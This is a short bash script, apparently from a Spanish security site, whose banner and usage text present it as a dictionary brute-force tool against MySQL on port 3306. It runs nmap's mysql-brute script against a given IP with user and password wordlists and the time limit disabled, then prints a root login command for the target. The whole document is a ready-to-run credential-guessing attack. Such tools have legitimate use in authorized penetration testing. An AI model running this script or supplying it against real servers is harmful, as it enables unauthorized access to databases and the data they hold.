#!/bin/bash
cat << "INFO"

██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███╗   ███╗██╗   ██╗███████╗ ██████╗ ██╗             
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ████╗ ████║╚██╗ ██╔╝██╔════╝██╔═══██╗██║             
██████╔╝██████╔╝██║   ██║   ██║   █████╗      ██╔████╔██║ ╚████╔╝ ███████╗██║   ██║██║             
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██║╚██╔╝██║  ╚██╔╝  ╚════██║██║▄▄ ██║██║             
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║ ╚═╝ ██║   ██║   ███████║╚██████╔╝███████╗        
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝     ╚═╝   ╚═╝   ╚══════╝ ╚══▀▀═╝ ╚══════╝     
                                              http://www.hackingyseguridad.com/ v1.0 (2025)

INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a MySQL en 3306/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh brutemysql2.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 -p 3306 --script mysql-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -O
echo
echo "mysql -h $1 -u root -p "
echo
